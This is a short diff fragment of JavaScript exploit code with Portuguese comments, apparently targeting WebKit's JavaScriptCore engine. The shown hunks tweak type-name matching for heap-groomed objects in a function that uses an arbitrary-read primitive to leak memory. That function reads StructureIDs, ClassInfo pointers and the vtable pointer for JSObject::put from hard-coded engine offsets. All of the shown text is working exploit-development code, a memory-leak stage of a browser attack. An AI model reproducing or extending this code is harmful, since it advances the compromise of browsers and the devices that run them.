         if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
-            obj_type_name === "JS Object" &&
+            obj_type_name.includes("JS Object") && // Use includes para "JS Object (Groomed)"
             structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID) {
             logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado JSObject_Simple_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
         }
         if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== null &&
-            obj_type_name === "ArrayBuffer" &&
+            obj_type_name.includes("ArrayBuffer") && // Use includes para "ArrayBuffer (Groomed)"
             structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) {
             logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado ArrayBuffer_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
         }
@@ -352,7 +472,7 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
 
         // 2. LEITURAS DA STRUCTURE
         logS3(`  Iniciando leituras da Structure para "${obj_type_name}"...`, "debug");
-        await PAUSE_S3(50); // Pequena pausa
+        await PAUSE_S3(50);
         
         const class_info_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
         const class_info_addr = arb_read_func(class_info_ptr_addr);
@@ -395,7 +515,7 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
             throw new Error("AGGREGATED_FLAGS poluído.");
         }
 
-        await PAUSE_S3(50); // Pequena pausa
+        await PAUSE_S3(50);
 
         // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
         const js_object_put_func_ptr_addr_in_structure = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
